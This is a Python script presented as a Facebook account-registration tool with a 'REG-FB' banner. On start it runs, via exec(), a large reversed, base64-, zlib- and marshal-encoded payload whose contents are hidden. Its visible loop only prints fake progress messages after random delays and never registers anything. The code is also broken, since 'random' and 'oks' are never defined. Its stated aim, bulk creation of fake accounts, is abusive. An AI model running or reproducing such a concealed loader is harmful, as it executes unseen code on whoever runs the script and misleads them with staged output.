###___IMPORTS___###
import requests,re,json,os,sys,time

###___###
ok=["heh"]

###___FUNCTIONS___###
def line():
    print("-"*40)
    
def dn():
    time.sleep(random.randint(3,7))
    
def dnn():
    time.sleep(random.randint(10,20))
    
###___LOGO___###
def logo():
    os.system("clear")
    print("""\033[1;97m   
    ____  ____________      __________ 
   / __ \/ ____/ ____/     / ____/ __ )
  / /_/ / __/ / / ________/ /_  / __  |
 / _, _/ /___/ /_/ /_____/ __/ / /_/ / 
/_/ |_/_____/\____/     /_/   /_____/ """)
    line()                                       

###___NOTHING___###
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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'))

###___CREATE___###
def CRTT():
    print(f"[{len(ok)}] Registering Account")
    dn()
    print(f"[{len(ok)}] Checking Account Live or Died")
    dn()
    print(f"[{len(ok)}] Account Is Live, Adding Email to Account")
    dn()
    print(f"[{len(ok)}] Finding Code!")
    dnn()
    print(f"[{len(ok)}] Submiting Code")
    dn()
    line()
    print("\033[1;92m[HANNAN-OK] "+random.choice(oks)+"\033[1;97m")
    line()
    dn()

logo()    
while True:
    CRTT()
    
    
    